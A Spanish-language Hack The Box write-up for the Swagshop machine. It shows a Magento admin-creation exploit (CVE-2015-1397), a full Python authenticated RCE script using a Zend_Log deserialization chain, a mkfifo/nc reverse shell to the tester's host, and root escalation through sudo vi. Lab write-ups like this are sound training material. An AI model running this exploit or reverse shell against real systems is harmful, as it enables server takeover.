---
tags:
title: Swagshop - Easy (HTB)
permalink: /Swagshop-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.229.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-07 20:35 -03
Nmap scan report for 10.129.229.138
Host is up (0.64s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Did not follow redirect to http://swagshop.htb/
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.68 seconds
```

# Service enumeration

Como vemos que hay un servicio `http`, agregamos la ip al `/etc/hosts`

```bash
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       zsln.kali       zsln

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.129.229.138 swagshop.htb
```

![{5213BCF9-2995-4B53-9D51-B3DDB2FCA432}](images/{5213BCF9-2995-4B53-9D51-B3DDB2FCA432}.png)

Vemos que corre Magento E-commerce, ya que lo podemos ver en el codigo fuente.

```html

<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Home page</title>
<meta name="description" content="Default Description" />
<meta name="keywords" content="Magento, Varien, E-commerce" />
<meta name="robots" content="*" />
```

Si buscamos por algun exploit que automatize el proceso nos encontramos con este [enlace](https://github.com/0xDTC/Magento-eCommerce-RCE-CVE-2015-1397)

Donde nos clonamos el repositorio con el exploit

```bash
chmod +x CVE-2015-1397
```

Y lo ejecutamos, una vez lo ejecutamos nos hace las siguiente preguntas y luego nos va a crear un usuario como `admin`.

```bash
./CVE-2015-1397                                                                                                           
Enter the target URL (e.g., http://target.com/): http://swagshop.htb/index.php
Enter the new admin username: zs1nn
Enter the new admin password: zs1n123
[*] Sending payload to http://swagshop.htb/index.php/admin/Cms_Wysiwyg/directive/index/
[+] Exploit successful. Admin account created: zs1nn / zs1n123
```

Que si nos vamos al panel de admin y colocamos las credenciales, nos logueamos correctamente

![{3A28C002-5BCD-491C-9B96-449F8DEEED90}](images/{3A28C002-5BCD-491C-9B96-449F8DEEED90}.png)

Ademas antes viendo por escploit para magento, habia uno que una vez auntenticados podiamos tambien tener ejecucion remota de comandos.

```bash
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                                                                             | php/webapps/37811.py
```

Sin embargo en mi caso, el mismo me fallo y diseñe uno amoldado a ese script

```bash
#!/usr/bin/python3
# Magento CE < 1.9.0.1 Post Auth RCE - Python 3 Fixed Version

from hashlib import md5
import sys
import re
import base64
import mechanize

def usage():
    print(f"Usage: python3 {sys.argv[0]} <target> <argument>")
    print(f"Example: python3 {sys.argv[0]} http://target.com/index.php/admin \"uname -a\"")
    sys.exit(1)

if len(sys.argv) != 3:
    usage()

# Command-line args
target = sys.argv[1]
arg = sys.argv[2]

# Config - MODIFICA ESTAS CREDENCIALES
username = 'zs1n'
password = 'zs1n123'
php_function = 'system'
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # Obtén esto de /app/etc/local.xml

print(f"[*] Target: {target}")
print(f"[*] Command: {arg}")

# POP chain payload
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\x00*\x00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\x00*\x00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\x00*\x00_subjectPrependText\";N;s:10:\"\x00*\x00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\x00*\x00_yamlEncoder\";s:%d:\"%s\";s:17:\"\x00*\x00'     \
          '_loadedSection\";N;s:10:\"\x00*\x00_config\";O:13:\"Varien_Object\":1:{s:8:\"\x00*\x00_data\"' \
          ';s:%d:\"%s\";}}s:8:\"\x00*\x00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                     len(arg), arg)

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_redirect(True)
br.set_handle_refresh(True)

# Asegúrate de que la URL tenga /admin
if '/admin' not in target:
    if target.endswith('/'):
        target = target + 'admin'
    elif target.endswith('/index.php'):
        target = target.replace('/index.php', '/index.php/admin')
    else:
        target = target + '/admin'

print(f"[*] Intentando login en: {target}")

try:
    request = br.open(target)
    print("[+] Página cargada")
    
    # Debug: Lista los formularios
    forms_list = list(br.forms())
    print(f"[*] Formularios encontrados: {len(forms_list)}")
    
    if len(forms_list) == 0:
        print("[-] No se encontraron formularios. Verifica la URL.")
        sys.exit(1)
    
    # Selecciona el primer formulario
    br.select_form(nr=0)
    
    # Debug: Lista los controles del formulario
    print("[*] Controles del formulario:")
    for control in br.form.controls:
        print(f"    - {control.name} ({control.type})")
    
    # Intenta encontrar los campos de login
    username_field = None
    password_field = None
    
    for control in br.form.controls:
        if control.name is None:
            continue
        if 'username' in control.name.lower() or 'user' in control.name.lower():
            username_field = control.name
        if 'password' in control.name.lower() or 'pass' in control.name.lower():
            password_field = control.name
    
    if not username_field or not password_field:
        print("[-] No se encontraron campos de login estándar")
        print("[*] Controles disponibles:")
        for control in br.form.controls:
            print(f"    {control.name}")
        sys.exit(1)
    
    print(f"[+] Usando campos: {username_field} / {password_field}")
    
    br[username_field] = username
    br[password_field] = password
    
    print("[*] Enviando credenciales...")
    request = br.submit()
    content = request.read().decode('utf-8', errors='ignore')
    
    if 'dashboard' in content.lower() or 'logout' in content.lower():
        print("[+] Login exitoso!")
    else:
        print("[-] Login falló. Verifica las credenciales.")
        sys.exit(1)
    
    # Busca la URL ajax
    url_match = re.search(r"ajaxBlockUrl\s*=\s*['\"]([^'\"]+)['\"]", content)
    if not url_match:
        print("[-] No se encontró ajaxBlockUrl")
        sys.exit(1)
    
    url = url_match.group(1)
    print(f"[+] ajaxBlockUrl: {url}")
    
    # Busca el FORM_KEY
    key_match = re.search(r"FORM_KEY\s*=\s*['\"]([^'\"]+)['\"]", content)
    if not key_match:
        print("[-] No se encontró FORM_KEY")
        sys.exit(1)
    
    key = key_match.group(1)
    print(f"[+] FORM_KEY: {key}")
    
    # Request al endpoint ajax
    ajax_url = url + 'block/tab_orders/period/7d/?isAjax=true'
    ajax_data = 'isAjax=false&form_key=' + key
    print(f"[*] Solicitando: {ajax_url}")
    
    request = br.open(ajax_url, data=ajax_data.encode())
    ajax_content = request.read().decode('utf-8', errors='ignore')
    
    # Busca el tunnel
    tunnel_match = re.search(r'src="([^"]+)\?ga=', ajax_content)
    if not tunnel_match:
        print("[-] No se encontró tunnel URL")
        sys.exit(1)
    
    tunnel = tunnel_match.group(1)
    print(f"[+] Tunnel: {tunnel}")
    
    # Construye el exploit
    payload_encoded = base64.b64encode(payload.encode()).decode()
    gh = md5((payload_encoded + install_date).encode()).hexdigest()
    
    exploit_url = tunnel + '?ga=' + payload_encoded + '&h=' + gh
    print(f"[*] Explotando...")
    
    request = br.open(exploit_url)
    result = request.read().decode('utf-8', errors='ignore')
    print("\n[+] Resultado:")
    print(result)
    
except mechanize.HTTPError as e:
    print(f"[!] HTTP Error: {e.code}")
    print(e.read().decode('utf-8', errors='ignore'))
except mechanize.URLError as e:
    print(f"[!] URL Error: {e.reason}")
except Exception as e:
    print(f"[!] Error: {e}")
    import traceback
    traceback.print_exc()

```

Lo ejecutamos 

```bash
python3 exxx.py http://swagshop.htb/index.php "whoami"  
[*] Target: http://swagshop.htb/index.php
[*] Command: whoami
[*] Intentando login en: http://swagshop.htb/index.php/admin
[+] Página cargada
[*] Formularios encontrados: 1
[*] Controles del formulario:
    - form_key (hidden)
    - login[username] (text)
    - dummy (text)
    - login[password] (password)
    - None (submit)
[+] Usando campos: login[username] / login[password]
[*] Enviando credenciales...
[+] Login exitoso!
[+] ajaxBlockUrl: http://swagshop.htb/index.php/admin/dashboard/ajaxBlock/key/fa048be2f44ee6877d115503266b278c/
[+] FORM_KEY: U8nr1J3yZvE6NDQd
[*] Solicitando: http://swagshop.htb/index.php/admin/dashboard/ajaxBlock/key/fa048be2f44ee6877d115503266b278c/block/tab_orders/period/7d/?isAjax=true
[+] Tunnel: http://swagshop.htb/index.php/admin/dashboard/tunnel/key/bfe2df285cc8c114800e43c521071747/
[*] Explotando...
[!] HTTP Error: 500
www-data
```

Ahora que tenemos ejecucion de comandos, podemos enviarnos una shell con `mkfifo`.

```bash
python3 exxx.py http://swagshop.htb/index.php "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.17.19 4444 >/tmp/f"      
[*] Target: http://swagshop.htb/index.php
[*] Command: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.17.19 4444 >/tmp/f
[*] Intentando login en: http://swagshop.htb/index.php/admin
[+] Página cargada
[*] Formularios encontrados: 1
[*] Controles del formulario:
    - form_key (hidden)
    - login[username] (text)
    - dummy (text)
    - login[password] (password)
    - None (submit)
[+] Usando campos: login[username] / login[password]
[*] Enviando credenciales...
[+] Login exitoso!
[+] ajaxBlockUrl: http://swagshop.htb/index.php/admin/dashboard/ajaxBlock/key/29e2f9fa3b338bd693dfef9afd8bd80a/
[+] FORM_KEY: sHcq36JlFXrKODh5
[*] Solicitando: http://swagshop.htb/index.php/admin/dashboard/ajaxBlock/key/29e2f9fa3b338bd693dfef9afd8bd80a/block/tab_orders/period/7d/?isAjax=true
[+] Tunnel: http://swagshop.htb/index.php/admin/dashboard/tunnel/key/15e9c861e2e8d8aabc2d688a12dea0a3/
[*] Explotando...
```

Y desde nuestro listener con nc vemos que recibimos nuestra shell

```bash
sudo nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.138] 35314
bash: cannot set terminal process group (1848): Inappropriate ioctl for device
bash: no job control in this shell
www-data@swagshop:/var/www/html$ whoami
whoami
www-data
```

```bash
www-data@swagshop:/home$ ls
haris
www-data@swagshop:/home$ cd haris/
www-data@swagshop:/home/haris$ cat user.txt 
0aad87379af6c6e6d2857d928b082ee9

```

## Shell as root

Vemos que tenemos privilegios en el editor de texto `vi`, y para aprovecharnos de eso para escalar privilegios podemos ver en [gtfobins](https://gtfobins.github.io/gtfobins/vi/#sudo) para ver como hacerlo primero, sabemos que tenemos que ejecutarlo sobre la ruta `/var/www/html`, asi que podemos probar pasarle como argumento `../../../../root/root.txt`, para ver si podemos ver la flag.

```bash
sudo /usr/bin/vi /var/www/html/../../../../../../root/root.txt        

E558: Terminal entry not found in terminfo
'unknown' not known. Available builtin terminals are:
    builtin_amiga
    builtin_beos-ansi
    builtin_ansi
    builtin_pcansi
    builtin_win32
    builtin_vt320
    builtin_vt52
    builtin_xterm
    builtin_iris-ansi
    builtin_debug
    builtin_dumb
defaulting to 'ansi'
afe51306beb440ef89f89d7a4b5045f6
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
<./../../../../../root/root.txt" [readonly] 1L, 33C           1,1           All
```

Y vemos que podemos efectivamente ver la flag, pero si queremos acceder como root para poder verla bien, hacemos lo siguiente

```bash
www-data@swagshop:/var/www/html$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

```bash 
:set shell=/bin/bash
```

```bash
:shell
root@swagshop:/var/www/html# whoami
root
root@swagshop:/var/www/html#
```

Y ya vemos la flag de root

```bash
root@swagshop:/var/www/html# cat /root/root.txt 
afe51306beb440ef89f89d7a4b5045f6
```

`~Happy Hacking.`